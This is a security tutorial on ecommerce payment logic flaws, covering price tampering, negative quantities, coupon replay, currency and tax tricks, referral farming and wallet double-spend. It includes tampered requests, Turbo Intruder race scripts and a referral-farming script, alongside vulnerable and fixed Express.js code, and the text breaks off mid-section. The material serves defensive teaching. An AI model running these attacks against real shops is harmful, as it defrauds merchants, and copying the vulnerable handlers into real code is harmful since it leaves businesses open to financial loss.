---
title: "Payment Manipulation and Ecommerce Logic Abuse: Exploiting Checkout Flows, Race Conditions, and Webhook Vulnerabilities"
meta_description: "A deep technical guide to exploiting payment manipulation vulnerabilities in ecommerce applications including price tampering, negative quantity abuse, coupon replay, race conditions, currency manipulation, wallet double-spend, Stripe/PayPal webhook abuse, and payment gateway callback exploitation with real payloads, Burp Suite workflows, and vulnerable/fixed Express.js code."
slug: "payment-manipulation-ecommerce-logic-abuse"
keywords:
  - payment manipulation
  - price tampering
  - ecommerce logic bugs
  - race condition checkout
  - coupon stacking exploit
  - negative quantity abuse
  - currency manipulation
  - webhook abuse
  - Stripe webhook vulnerability
  - PayPal IPN manipulation
  - wallet double spend
  - discount brute force
  - referral abuse
  - Burp Turbo Intruder
  - payment gateway callback
  - bug bounty ecommerce
  - checkout flow exploitation
series: "Security Deep Dive"
---

# Payment Manipulation and Ecommerce Logic Abuse: Exploiting Checkout Flows, Race Conditions, and Webhook Vulnerabilities

## Introduction

Payment logic vulnerabilities are the bugs that cost companies real money -- not in reputational damage or theoretical data breach costs, but in direct, immediate financial loss. When a researcher discovers that they can buy a $2,000 laptop for $0.01, or apply a 100%-off coupon to every order, or double-spend a $500 wallet balance, the impact is measured in dollars drained from the business in real time.

These vulnerabilities are fundamentally different from injection attacks or authentication bypasses. They are business logic flaws: the code executes exactly as written, but what was written does not match what the business intended. No WAF signature detects "the price field was modified in transit." No static analysis tool flags "the coupon validation does not check if the coupon was already used." These bugs require understanding the checkout flow, the payment integration architecture, and the assumptions developers make about client behavior.

This article targets experienced security practitioners who understand HTTP interception, Burp Suite, API testing, and basic payment gateway architectures. We will cover price tampering, negative quantity abuse, coupon stacking and replay, race conditions during checkout (with Turbo Intruder examples), currency manipulation, tax bypass, referral abuse, wallet double-spend, discount code brute forcing, payment gateway callback manipulation, Stripe and PayPal webhook abuse, and complete vulnerable and fixed Express.js code for each scenario. Every payload is realistic. Every attack has been observed in real-world applications.

---

## 1. Price Tampering

### 1.1 The Fundamental Problem

Price tampering occurs when the client sends a price value to the server, and the server uses that client-provided price instead of looking up the canonical price from its own database. This sounds absurdly naive, and it is -- yet it remains one of the most commonly reported ecommerce vulnerabilities.

**Where prices get sent from the client:**

- Hidden form fields: `<input type="hidden" name="price" value="99.99">`
- API request bodies: `{"product_id": 42, "price": 99.99}`
- URL parameters: `/checkout?item=42&price=99.99`
- Custom headers: `X-Item-Price: 99.99`
- Cookies: `cart_total=99.99`
- Client-side calculated totals sent in the final checkout request

### 1.2 Interception and Modification

**Legitimate add-to-cart request:**

```
POST /api/v1/cart/add HTTP/1.1
Host: shop.target.com
Authorization: Bearer <token>
Content-Type: application/json

{
  "product_id": "prod_laptop_x1",
  "quantity": 1,
  "price": 1999.99,
  "currency": "USD"
}
```

**Tampered request (modify in Burp Proxy):**

```
POST /api/v1/cart/add HTTP/1.1
Host: shop.target.com
Authorization: Bearer <token>
Content-Type: application/json

{
  "product_id": "prod_laptop_x1",
  "quantity": 1,
  "price": 0.01,
  "currency": "USD"
}
```

If the server stores the client-provided price, the cart now contains a $1,999.99 laptop for $0.01.

### 1.3 Vulnerable Express.js Checkout Code

```javascript
// VULNERABLE: Trusts price from client request
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const { Pool } = require('pg');

const app = express();
app.use(express.json());
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// VULNERABLE: Price comes from request body
app.post('/api/v1/cart/add', async (req, res) => {
  const { product_id, quantity, price } = req.body;
  const userId = req.user.sub;

  await pool.query(
    `INSERT INTO cart_items (user_id, product_id, quantity, unit_price)
     VALUES ($1, $2, $3, $4)
     ON CONFLICT (user_id, product_id) DO UPDATE SET quantity = $3, unit_price = $4`,
    [userId, product_id, quantity, price] // BUG: price from client
  );

  return res.json({ status: 'added' });
});

// VULNERABLE: Calculates total from potentially tampered cart
app.post('/api/v1/checkout', async (req, res) => {
  const userId = req.user.sub;

  const cartItems = await pool.query(
    'SELECT * FROM cart_items WHERE user_id = $1', [userId]
  );

  let total = 0;
  for (const item of cartItems.rows) {
    total += item.unit_price * item.quantity; // Uses stored (tampered) price
  }

  const paymentIntent = await stripe.paymentIntents.create({
    amount: Math.round(total * 100), // Convert to cents
    currency: 'usd',
    metadata: { user_id: userId }
  });

  return res.json({ client_secret: paymentIntent.client_secret });
});
```

### 1.4 Fixed Express.js Checkout Code

```javascript
// FIXED: Server-side price lookup for all operations
app.post('/api/v1/cart/add', async (req, res) => {
  const { product_id, quantity } = req.body;  // NO price from client
  const userId = req.user.sub;

  // Look up the canonical price from the database
  const product = await pool.query(
    'SELECT id, price, is_active FROM products WHERE id = $1', [product_id]
  );

  if (product.rows.length === 0 || !product.rows[0].is_active) {
    return res.status(404).json({ error: 'Product not found' });
  }

  // Validate quantity
  if (!Number.isInteger(quantity) || quantity < 1 || quantity > 100) {
    return res.status(400).json({ error: 'Invalid quantity' });
  }

  const serverPrice = product.rows[0].price;

  await pool.query(
    `INSERT INTO cart_items (user_id, product_id, quantity, unit_price)
     VALUES ($1, $2, $3, $4)
     ON CONFLICT (user_id, product_id) DO UPDATE SET quantity = $3, unit_price = $4`,
    [userId, product_id, quantity, serverPrice] // Price from server DB
  );

  return res.json({ status: 'added', unit_price: serverPrice });
});

// FIXED: Re-validates prices at checkout time
app.post('/api/v1/checkout', async (req, res) => {
  const userId = req.user.sub;

  const cartItems = await pool.query(
    `SELECT ci.product_id, ci.quantity, p.price as current_price
     FROM cart_items ci
     JOIN products p ON ci.product_id = p.id
     WHERE ci.user_id = $1 AND p.is_active = true`,
    [userId]
  );

  if (cartItems.rows.length === 0) {
    return res.status(400).json({ error: 'Cart is empty' });
  }

  let total = 0;
  const lineItems = [];
  for (const item of cartItems.rows) {
    const lineTotal = item.current_price * item.quantity;
    total += lineTotal;
    lineItems.push({
      product_id: item.product_id,
      quantity: item.quantity,
      unit_price: item.current_price,
      line_total: lineTotal
    });
  }

  // Sanity check: total must be positive
  if (total <= 0) {
    return res.status(400).json({ error: 'Invalid cart total' });
  }

  const paymentIntent = await stripe.paymentIntents.create({
    amount: Math.round(total * 100),
    currency: 'usd',
    metadata: {
      user_id: userId,
      line_items: JSON.stringify(lineItems) // Audit trail
    }
  });

  // Store the order with server-calculated amounts
  await pool.query(
    `INSERT INTO orders (user_id, total_amount, payment_intent_id, line_items, status)
     VALUES ($1, $2, $3, $4, 'pending')`,
    [userId, total, paymentIntent.id, JSON.stringify(lineItems)]
  );

  return res.json({ client_secret: paymentIntent.client_secret, total });
});
```

**The critical fix:** The price is never accepted from the client. It is always looked up from the `products` table at the time of addition and re-validated at checkout time.

---

## 2. Negative Quantity Abuse

### 2.1 The Attack

If the application does not validate that quantities are positive integers, an attacker can add items with negative quantities to reduce the cart total:

```
POST /api/v1/cart/add HTTP/1.1
Content-Type: application/json
Authorization: Bearer <token>

{
  "product_id": "prod_expensive_item",
  "quantity": -5
}
```

**Math of the attack:**

| Item | Quantity | Unit Price | Line Total |
|---|---|---|---|
| Laptop | 1 | $1,999.99 | $1,999.99 |
| Phone Case | -50 | $29.99 | -$1,499.50 |
| **Cart Total** | | | **$500.49** |

The attacker gets a $2,000 laptop for $500 by adding negative quantities of a cheap item.

### 2.2 Variations

**Negative quantity in update:**

```
PUT /api/v1/cart/items/item_abc123 HTTP/1.1
Content-Type: application/json

{
  "quantity": -10
}
```

**Floating-point quantity:**

```json
{
  "product_id": "prod_laptop_x1",
  "quantity": 0.001
}
```

If the application multiplies `0.001 * 1999.99`, the total becomes $2.00.

**Integer overflow:**

```json
{
  "product_id": "prod_laptop_x1",
  "quantity": 2147483647
}
```

If the backend uses a 32-bit signed integer, `2147483647 * 1999.99` overflows to a negative number or zero.

### 2.3 Validation Code

```javascript
// Comprehensive quantity validation
function validateQuantity(quantity) {
  if (typeof quantity !== 'number') return false;
  if (!Number.isInteger(quantity)) return false;
  if (quantity < 1) return false;
  if (quantity > 999) return false;  // Business logic cap
  return true;
}

// Comprehensive price calculation
function calculateTotal(items) {
  let total = 0;
  for (const item of items) {
    if (item.unit_price <= 0) throw new Error('Invalid price');
    if (item.quantity <= 0) throw new Error('Invalid quantity');

    const lineTotal = item.unit_price * item.quantity;

    // Guard against floating-point issues by rounding to cents
    const roundedLineTotal = Math.round(lineTotal * 100) / 100;
    total += roundedLineTotal;
  }

  total = Math.round(total * 100) / 100;

  if (total <= 0) throw new Error('Invalid total');
  if (total > 1000000) throw new Error('Total exceeds maximum');

  return total;
}
```

---

## 3. Coupon Stacking and Coupon Replay

### 3.1 Coupon Stacking

Coupon stacking occurs when an application allows multiple discount codes to be applied to a single order, with each subsequent discount applied to the already-reduced total:

```
POST /api/v1/cart/apply-coupon HTTP/1.1
Content-Type: application/json

{"coupon_code": "SAVE20"}
```

Response: `{"discount": "20%", "new_total": 79.99}`

```
POST /api/v1/cart/apply-coupon HTTP/1.1
Content-Type: application/json

{"coupon_code": "SUMMER15"}
```

Response: `{"discount": "15%", "new_total": 67.99}`

```
POST /api/v1/cart/apply-coupon HTTP/1.1
Content-Type: application/json

{"coupon_code": "WELCOME10"}
```

Response: `{"discount": "10%", "new_total": 61.19}`

Three coupons reduced a $99.99 item to $61.19 (38.8% total discount).

### 3.2 Coupon Replay

Coupon replay occurs when a single-use coupon can be reused because the "used" flag is checked and set non-atomically:

**The race condition:**

```
Thread 1: Check if coupon SAVE50 is used -> No
Thread 2: Check if coupon SAVE50 is used -> No
Thread 1: Apply SAVE50, mark as used
Thread 2: Apply SAVE50, mark as used (already applied by Thread 1, applied again)
```

**HTTP request for replay testing:**

```
POST /api/v1/cart/apply-coupon HTTP/1.1
Content-Type: application/json

{"coupon_code": "SAVE50", "order_id": "order_001"}
```

Send this request 50 times simultaneously using Burp Turbo Intruder.

### 3.3 Vulnerable Coupon Code

```javascript
// VULNERABLE: Non-atomic coupon validation and application
app.post('/api/v1/cart/apply-coupon', async (req, res) => {
  const { coupon_code } = req.body;
  const userId = req.user.sub;

  // Step 1: Look up coupon
  const coupon = await pool.query(
    'SELECT * FROM coupons WHERE code = $1', [coupon_code]
  );

  if (coupon.rows.length === 0) {
    return res.status(404).json({ error: 'Invalid coupon' });
  }

  const c = coupon.rows[0];

  // BUG 1: No check for already-applied coupons (stacking)
  // BUG 2: Check and update are separate operations (race condition)

  // Step 2: Check if coupon is still valid
  if (c.times_used >= c.max_uses) {
    return res.status(400).json({ error: 'Coupon expired' });
  }

  // RACE WINDOW: Between the check above and the update below,
  // concurrent requests can all pass the check

  // Step 3: Apply discount
  const cart = await pool.query(
    'SELECT total FROM carts WHERE user_id = $1', [userId]
  );

  const discount = cart.rows[0].total * (c.discount_percent / 100);
  const newTotal = cart.rows[0].total - discount;

  await pool.query(
    'UPDATE carts SET total = $1, applied_coupons = array_append(applied_coupons, $2) WHERE user_id = $3',
    [newTotal, coupon_code, userId]
  );

  // Step 4: Increment usage count
  await pool.query(
    'UPDATE coupons SET times_used = times_used + 1 WHERE code = $1',
    [coupon_code]
  );

  return res.json({ discount, new_total: newTotal });
});
```

### 3.4 Fixed Coupon Code

```javascript
// FIXED: Atomic coupon validation with stacking prevention
app.post('/api/v1/cart/apply-coupon', async (req, res) => {
  const { coupon_code } = req.body;
  const userId = req.user.sub;

  const client = await pool.connect();

  try {
    await client.query('BEGIN');

    // Lock the coupon row to prevent race conditions
    const coupon = await client.query(
      'SELECT * FROM coupons WHERE code = $1 FOR UPDATE',
      [coupon_code]
    );

    if (coupon.rows.length === 0) {
      await client.query('ROLLBACK');
      return res.status(404).json({ error: 'Invalid coupon' });
    }

    const c = coupon.rows[0];

    // Check expiration
    if (new Date() > new Date(c.expires_at)) {
      await client.query('ROLLBACK');
      return res.status(400).json({ error: 'Coupon expired' });
    }

    // Check usage limit (atomic due to FOR UPDATE lock)
    if (c.times_used >= c.max_uses) {
      await client.query('ROLLBACK');
      return res.status(400).json({ error: 'Coupon usage limit reached' });
    }

    // Check per-user usage limit
    const userUsage = await client.query(
      'SELECT COUNT(*) FROM coupon_usage WHERE coupon_code = $1 AND user_id = $2',
      [coupon_code, userId]
    );

    if (parseInt(userUsage.rows[0].count) >= (c.max_uses_per_user || 1)) {
      await client.query('ROLLBACK');
      return res.status(400).json({ error: 'You already used this coupon' });
    }

    // Prevent stacking: check if any coupon is already applied
    const cart = await client.query(
      'SELECT total, applied_coupons FROM carts WHERE user_id = $1 FOR UPDATE',
      [userId]
    );

    if (cart.rows[0].applied_coupons && cart.rows[0].applied_coupons.length > 0) {
      // Check business rules for stacking
      if (!c.stackable) {
        await client.query('ROLLBACK');
        return res.status(400).json({
          error: 'Cannot combine this coupon with other discounts'
        });
      }
    }

    // Check if this specific coupon is already applied to this cart
    if (cart.rows[0].applied_coupons?.includes(coupon_code)) {
      await client.query('ROLLBACK');
      return res.status(400).json({ error: 'Coupon already applied' });
    }

    // Recalculate total from original item prices (not from discounted total)
    const items = await client.query(
      `SELECT ci.quantity, p.price
       FROM cart_items ci
       JOIN products p ON ci.product_id = p.id
       WHERE ci.user_id = $1`,
      [userId]
    );

    let subtotal = 0;
    for (const item of items.rows) {
      subtotal += item.price * item.quantity;
    }

    // Apply all discounts from scratch (prevents multiplicative stacking)
    const allCoupons = [...(cart.rows[0].applied_coupons || []), coupon_code];
    let totalDiscount = 0;

    for (const code of allCoupons) {
      const cp = await client.query(
        'SELECT discount_percent, max_discount_amount FROM coupons WHERE code = $1',
        [code]
      );
      if (cp.rows.length > 0) {
        let discount = subtotal * (cp.rows[0].discount_percent / 100);
        if (cp.rows[0].max_discount_amount) {
          discount = Math.min(discount, cp.rows[0].max_discount_amount);
        }
        totalDiscount += discount;
      }
    }

    // Cap total discount at subtotal (prevent negative totals)
    totalDiscount = Math.min(totalDiscount, subtotal);
    const newTotal = Math.round((subtotal - totalDiscount) * 100) / 100;

    // Minimum order amount check
    if (newTotal < 0.50) {
      await client.query('ROLLBACK');
      return res.status(400).json({ error: 'Order total too low' });
    }

    // Apply atomically
    await client.query(
      'UPDATE carts SET total = $1, applied_coupons = $2 WHERE user_id = $3',
      [newTotal, allCoupons, userId]
    );

    await client.query(
      'UPDATE coupons SET times_used = times_used + 1 WHERE code = $1',
      [coupon_code]
    );

    await client.query(
      'INSERT INTO coupon_usage (coupon_code, user_id, used_at) VALUES ($1, $2, NOW())',
      [coupon_code, userId]
    );

    await client.query('COMMIT');

    return res.json({ discount: totalDiscount, new_total: newTotal });

  } catch (err) {
    await client.query('ROLLBACK');
    return res.status(500).json({ error: 'Internal error' });
  } finally {
    client.release();
  }
});
```

---

## 4. Race Conditions During Checkout

### 4.1 The Core Problem

Race conditions in ecommerce occur when multiple concurrent requests exploit the gap between a check and an action. The most common scenarios:

- **Double-spend:** Submit the same payment twice before either completes
- **Inventory bypass:** Two users buy the last item simultaneously
- **Coupon reuse:** Apply a single-use coupon from concurrent requests (covered above)
- **Wallet overdraft:** Spend more than the wallet balance by sending parallel requests

### 4.2 Burp Suite Turbo Intruder for Race Conditions

Turbo Intruder is the tool of choice because it can send dozens of requests in a single TCP burst, arriving at the server within microseconds of each other.

**Turbo Intruder script for wallet double-spend:**

```python
# Turbo Intruder script: race_wallet_spend.py
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=1,
        pipeline=False
    )

    # Queue 30 identical purchase requests
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Open the gate: all 30 requests fire simultaneously
    engine.openGate('race1')
    engine.complete(timeout=10)


def handleResponse(req, interesting):
    table.add(req)
```

**The request being raced:**

```
POST /api/v1/wallet/purchase HTTP/1.1
Host: shop.target.com
Authorization: Bearer <token>
Content-Type: application/json

{
  "product_id": "prod_gift_card_100",
  "payment_method": "wallet",
  "amount": 100.00
}
```

If the wallet balance is $100 and 30 concurrent requests fire, the check `balance >= amount` may pass for multiple requests before any of them deducts the balance.

### 4.3 Turbo Intruder for Inventory Race

```python
# race_last_item.py
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,
        requestsPerConnection=1,
        pipeline=False
    )

    # Create 20 different user sessions to buy the same item
    tokens = [
        "eyJ..user1..",
        "eyJ..user2..",
        "eyJ..user3..",
        # ... 20 tokens
    ]

    for i, token in enumerate(tokens):
        req = target.req.replace(
            "Authorization: Bearer REPLACE_TOKEN",
            f"Authorization: Bearer {token}"
        )
        engine.queue(req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=10)


def handleResponse(req, interesting):
    # Check for successful purchase (status 200 with order confirmation)
    if '200' in req.status and 'order_id' in req.response:
        table.add(req)
```

### 4.4 Detecting Race Condition Vulnerability

**Indicators of vulnerability:**

1. **No database locking:** Queries use `SELECT` without `FOR UPDATE`
2. **Check-then-act pattern:** Separate queries for validation and mutation
3. **No idempotency keys:** Repeated requests create duplicate records
4. **No distributed locks:** In microservice architectures, no Redis lock or similar mechanism

**Vulnerable pattern:**

```javascript
// VULNERABLE: Classic check-then-act without locking
app.post('/api/v1/wallet/purchase', async (req, res) => {
  const { product_id, amount } = req.body;
  const userId = req.user.sub;

  // CHECK: Read the balance
  const wallet = await pool.query(
    'SELECT balance FROM wallets WHERE user_id = $1', [userId]
  );

  if (wallet.rows[0].balance < amount) {
    return res.status(400).json({ error: 'Insufficient balance' });
  }

  // RACE WINDOW: Other requests read the same balance here

  // ACT: Deduct the balance
  await pool.query(
    'UPDATE wallets SET balance = balance - $1 WHERE user_id = $2',
    [amount, userId]
  );

  // Create the order
  await pool.query(
    'INSERT INTO orders (user_id, product_id, amount, status) VALUES ($1, $2, $3, $4)',
    [userId, product_id, amount, 'completed']
  );

  return res.json({ status: 'purchased' });
});
```

### 4.5 Fixed Race-Condition-Proof Code

```javascript
// FIXED: Atomic operation with database-level locking
app.post('/api/v1/wallet/purchase', async (req, res) => {
  const { product_id, amount, idempotency_key } = req.body;
  const userId = req.user.sub;

  // Idempotency check: reject duplicate requests
  if (idempotency_key) {
    const existing = await pool.query(
      'SELECT id FROM orders WHERE idempotency_key = $1',
      [idempotency_key]
    );
    if (existing.rows.length > 0) {
      return res.json({ status: 'already_processed', order_id: existing.rows[0].id });
    }
  }

  const client = await pool.connect();

  try {
    await client.query('BEGIN');

    // Atomic balance check and deduction using a conditional UPDATE
    // This is a single statement -- no race window
    const result = await client.query(
      `UPDATE wallets
       SET balance = balance - $1
       WHERE user_id = $2 AND balance >= $1
       RETURNING balance`,
      [amount, userId]
    );

    if (result.rows.length === 0) {
      await client.query('ROLLBACK');
      return res.status(400).json({ error: 'Insufficient balance' });
    }

    // Also check inventory atomically
    const inventory = await client.query(
      `UPDATE products
       SET stock = stock - 1
       WHERE id = $1 AND stock > 0
       RETURNING stock`,
      [product_id]
    );

    if (inventory.rows.length === 0) {
      await client.query('ROLLBACK');
      return res.status(400).json({ error: 'Out of stock' });
    }

    // Create order with idempotency key
    const order = await client.query(
      `INSERT INTO orders (user_id, product_id, amount, status, idempotency_key)
       VALUES ($1, $2, $3, 'completed', $4)
       RETURNING id`,
      [userId, product_id, amount, idempotency_key]
    );

    await client.query('COMMIT');

    return res.json({
      status: 'purchased',
      order_id: order.rows[0].id,
      remaining_balance: result.rows[0].balance
    });

  } catch (err) {
    await client.query('ROLLBACK');

    // Handle unique constraint violation on idempotency_key
    if (err.code === '23505' && err.constraint === 'orders_idempotency_key_key') {
      return res.json({ status: 'already_processed' });
    }

    return res.status(500).json({ error: 'Internal error' });
  } finally {
    client.release();
  }
});
```

**Key fixes:**

1. **Atomic conditional UPDATE:** `UPDATE ... WHERE balance >= amount` eliminates the check-then-act race window. The database guarantees atomicity of a single statement.
2. **Transaction isolation:** `BEGIN`/`COMMIT` ensures all-or-nothing.
3. **Idempotency key:** Duplicate requests return the same result without creating duplicate orders.

---

## 5. Currency Manipulation

### 5.1 The Attack

If the application allows the client to specify the currency and converts it incorrectly (or does not convert at all), an attacker can exploit exchange rate differences:

```
POST /api/v1/checkout HTTP/1.1
Content-Type: application/json

{
  "cart_id": "cart_abc123",
  "currency": "IDR"
}
```

If the server charges 1999.99 IDR (Indonesian Rupiah) instead of 1999.99 USD, the attacker pays approximately $0.13 for a $2,000 item.

### 5.2 Variations

**Switching currency after price calculation:**

```
Step 1: Add item to cart (price calculated in USD: $99.99)
Step 2: At checkout, specify currency as JPY
Step 3: Server charges 99.99 JPY (~$0.67) instead of 99.99 USD
```

**Currency code injection:**

```json
{
  "amount": 99.99,
  "currency": "XXX"
}
```

Some payment gateways have test currencies or fallback behaviors for unknown currency codes.

**Three-letter code vs numeric code mismatch:**

```json
{
  "currency": "392"
}
```

ISO 4217 defines both alphabetic (USD) and numeric (840) codes. If the server uses one for validation and the gateway uses the other, mismatches can occur.

### 5.3 Prevention

```javascript
// Strict currency validation
const ALLOWED_CURRENCIES = new Set(['USD', 'EUR', 'GBP', 'CAD', 'AUD']);

function validateCurrency(currency) {
  if (!currency || typeof currency !== 'string') return false;
  if (!ALLOWED_CURRENCIES.has(currency.toUpperCase())) return false;
  return true;
}

// Fixed checkout: currency is determined server-side
app.post('/api/v1/checkout', async (req, res) => {
  const userId = req.user.sub;

  // Currency is determined by the user's account region, NOT from request
  const user = await pool.query(
    'SELECT region, currency FROM users WHERE id = $1', [userId]
  );

  const currency = user.rows[0].currency; // Server-determined

  // Prices in DB are stored in the base currency (USD)
  // Convert using server-side exchange rates, not client input
  const cart = await pool.query(
    `SELECT ci.quantity, p.price_usd
     FROM cart_items ci JOIN products p ON ci.product_id = p.id
     WHERE ci.user_id = $1`, [userId]
  );

  let totalUsd = 0;
  for (const item of cart.rows) {
    totalUsd += item.price_usd * item.quantity;
  }

  // Server-side conversion using locked exchange rates
  const rate = await getLockedExchangeRate('USD', currency);
  const totalLocal = Math.round(totalUsd * rate * 100) / 100;

  const paymentIntent = await stripe.paymentIntents.create({
    amount: Math.round(totalLocal * 100),
    currency: currency.toLowerCase(),
  });

  return res.json({ total: totalLocal, currency, client_secret: paymentIntent.client_secret });
});
```

---

## 6. Tax Bypass

### 6.1 The Attack

Tax calculation often depends on the shipping address. If an attacker can manipulate the address used for tax calculation separately from the actual shipping address:

```
POST /api/v1/checkout/calculate-tax HTTP/1.1
Content-Type: application/json

{
  "shipping_address": {
    "state": "OR",
    "zip": "97201",
    "country": "US"
  }
}
```

Oregon has no sales tax. The attacker calculates tax based on an Oregon address, then changes the shipping address to a taxable state before the order ships.

**Variation -- claiming tax-exempt status:**

```
POST /api/v1/checkout HTTP/1.1
Content-Type: application/json

{
  "cart_id": "cart_abc",
  "tax_exempt": true,
  "tax_exempt_id": "12-3456789"
}
```

If the tax exemption ID is not validated against a real database of exempt organizations, any value bypasses tax.

### 6.2 Prevention

```javascript
// Tax must be calculated at the moment of charge, using the final confirmed address
// Never cache tax calculations from a previous step
app.post('/api/v1/checkout/complete', async (req, res) => {
  const userId = req.user.sub;

  const order = await pool.query(
    'SELECT * FROM orders WHERE user_id = $1 AND status = $2',
    [userId, 'pending']
  );

  const shippingAddress = order.rows[0].shipping_address;

  // Calculate tax server-side at charge time, not before
  const taxRate = await calculateTaxRate(shippingAddress);
  const subtotal = order.rows[0].subtotal;
  const taxAmount = Math.round(subtotal * taxRate * 100) / 100;
  const total = subtotal + taxAmount;

  // Tax-exempt validation against real database
  if (order.rows[0].tax_exempt_id) {
    const isValidExemption = await validateTaxExemption(
      order.rows[0].tax_exempt_id,
      shippingAddress.state
    );
    if (!isValidExemption) {
      // Recalculate with tax
      // Do not trust the exemption claim
    }
  }

  // Charge the final amount including server-calculated tax
  const paymentIntent = await stripe.paymentIntents.create({
    amount: Math.round(total * 100),
    currency: 'usd',
  });

  return res.json({ subtotal, tax: taxAmount, total });
});
```

---

## 7. Referral Abuse

### 7.1 Self-Referral

The simplest referral abuse: a user generates a referral link and signs up using it themselves, possibly from a different email:

```
POST /api/v1/referral/claim HTTP/1.1
Content-Type: application/json

{
  "referral_code": "REF_USER1041",
  "new_user_email": "user1041+alt@gmail.com"
}
```

### 7.2 Referral Farming with Disposable Emails

```python
# Automated referral farming script
import requests
import random
import string

BASE_URL = "https://shop.target.com/api/v1"
REFERRAL_CODE = "REF_ATTACKER"

def generate_email():
    prefix = ''.join(random.choices(string.ascii_lowercase, k=10))
    domains = ['tempmail.com', 'guerrillamail.com', 'throwaway.email']
    return f"{prefix}@{random.choice(domains)}"

for i in range(100):
    email = generate_email()

    # Register new account with referral code
    resp = requests.post(f"{BASE_URL}/register", json={
        "email": email,
        "password": "P@ssw0rd123!",
        "referral_code": REFERRAL_CODE
    })

    if resp.status_code == 201:
        print(f"[+] Referral credited for {email}")

        # Some platforms require a minimum action (e.g., first purchase)
        token = resp.json().get("token")
        if token:
            headers = {"Authorization": f"Bearer {token}"}
            # Make minimum purchase to trigger referral bonus
            requests.post(f"{BASE_URL}/cart/add", json={
                "product_id": "prod_cheapest_item",
                "quantity": 1
            }, headers=headers)
```

### 7.3 Prevention

```javascript
// Referral abuse prevention
app.post('/api/v1/referral/claim', async (req, res) => {
  const { referral_code, new_user_id } = req.body;

  // 1. Validate referral code exists
  const referrer = await pool.query(
    'SELECT user_id, total_referrals FROM referral_codes WHERE code = $1',
    [referral_code]
  );

  if (referrer.rows.length === 0) {
    return res.status(404).json({ error: 'Invalid referral code' });
  }

  // 2. Check for self-referral (same IP, same device fingerprint, same email pattern)
  const newUser = await pool.query('SELECT * FROM users WHERE id = $1', [new_user_id]);
  const referrerUser = await pool.query('SELECT * FROM users WHERE id = $1', [referrer.rows[0].user_id]);

  if (newUser.rows[0].registration_ip === referrerUser.rows[0].registration_ip) {
    return res.status(400).json({ error: 'Referral not eligible' });
  }

  // 3. Check email domain -- block disposable email providers
  const emailDomain = newUser.rows[0].email.split('@')[1];
  const isDisposable = await isDisposableEmail(emailDomain);
  if (isDisposable) {
    return res.status(400).json({ error: 'Please use a non-disposable email' });
  }

  // 4. Rate limit referrals per referrer
  if (referrer.rows[0].total_referrals >= 50) {
    return res.status(400).json({ error: 'Referral limit reached' });
  }

  // 5. Delay reward until the referred user makes a qualifying purchase
  // Do NOT credit instantly -- credit after verified purchase + no chargeback window
  await pool.query(
    `INSERT INTO pending_referrals (referrer_id, referred_id, status, created_at)
     VALUES ($1, $2, 'pending_purchase', NOW())`,
    [referrer.rows[0].user_id, new_user_id]
  );

  return res.json({ status: 'Referral recorded. Bonus will be credited after qualifying purchase.' });
});
```

---

## 8. Wallet Double-Spend Bugs

### 8.1 The Attack in Detail

Wallet double-spend is a race condition where the same balance is spent multiple times before any deduction is persisted. This is distinct from general race conditions because it specifically targets stored-value systems.

**Attack flow:**

1. Wallet balance: $500.00
2. Send 10 concurrent requests, each purchasing a $100 gift card
3. All 10 requests read the balance as $500 (all pass the check)
4. All 10 requests deduct $100 (final balance: -$500 in the worst case, or $400 if only one deduction succeeds)
5. Attacker now has $1,000 in gift cards but only paid $500 (or $100)

**Turbo Intruder configuration:**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=1,
        pipeline=False
    )

    for i in range(10):
        engine.queue(target.req, gate='spend')

    engine.openGate('spend')
    engine.complete(timeout=10)

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)
```

### 8.2 Database-Level Fix

```sql
-- PostgreSQL: Use an advisory lock or conditional update
-- Option 1: Conditional UPDATE (preferred)
UPDATE wallets
SET balance = balance - 100.00
WHERE user_id = 'user_1041' AND balance >= 100.00
RETURNING balance;

-- If RETURNING returns no rows, the balance was insufficient
-- This is atomic at the database level -- no race window

-- Option 2: Serializable isolation level
BEGIN ISOLATION LEVEL SERIALIZABLE;
SELECT balance FROM wallets WHERE user_id = 'user_1041';
-- Application checks balance >= amount
UPDATE wallets SET balance = balance - 100.00 WHERE user_id = 'user_1041';
COMMIT;
-- If concurrent transaction commits first, this one gets a serialization failure
-- and must retry
```

### 8.3 Redis Distributed Lock for Microservices

```javascript
const Redis = require('ioredis');
const redis = new Redis(process.env.REDIS_URL);

async function acquireWalletLock(userId, ttlMs = 5000) {
  const lockKey = `wallet_lock:${userId}`;
  const lockValue = `${Date.now()}_${Math.random()}`;

  const acquired = await redis.set(lockKey, lockValue, 'NX', 'PX', ttlMs);

  if (acquired === 'OK') {
    return { lockKey, lockValue };
  }
  return null;
}

async function releaseWalletLock(lock) {
  // Only release if we still own the lock (compare-and-delete)
  const script = `
    if redis.call("get", KEYS[1]) == ARGV[1] then
      return redis.call("del", KEYS[1])
    else
      return 0
    end
  `;
  await redis.eval(script, 1, lock.lockKey, lock.lockValue);
}

app.post('/api/v1/wallet/purchase', async (req, res) => {
  const userId = req.user.sub;

  const lock = await acquireWalletLock(userId);
  if (!lock) {
    return res.status(429).json({ error: 'Purchase already in progress' });
  }

  try {
    // Proceed with purchase (only one request at a time per user)
    const result = await pool.query(
      'UPDATE wallets SET balance = balance - $1 WHERE user_id = $2 AND balance >= $1 RETURNING balance',
      [req.body.amount, userId]
    );

    if (result.rows.length === 0) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }

    // Create order...
    return res.json({ status: 'purchased', balance: result.rows[0].balance });
  } finally {
    await releaseWalletLock(lock);
  }
});
```

---

## 9. Discount Code Brute Forcing

### 9.1 The Attack

If discount codes follow a predictable pattern, an attacker can brute-force valid codes:

```
Common patterns:
SAVE10       -> SAVE15, SAVE20, SAVE25, SAVE50
SUMMER2025   -> WINTER2025, FALL2025, SPRING2025
BF2025       -> BF2026 (Black Friday)
WELCOME10    -> WELCOME15, WELCOME20
PARTNER-ACME -> PARTNER-GLOBEX, PARTNER-INITECH
```

**Burp Intruder configuration:**

```
POST /api/v1/cart/apply-coupon HTTP/1.1
Host: shop.target.com
Authorization: Bearer <token>
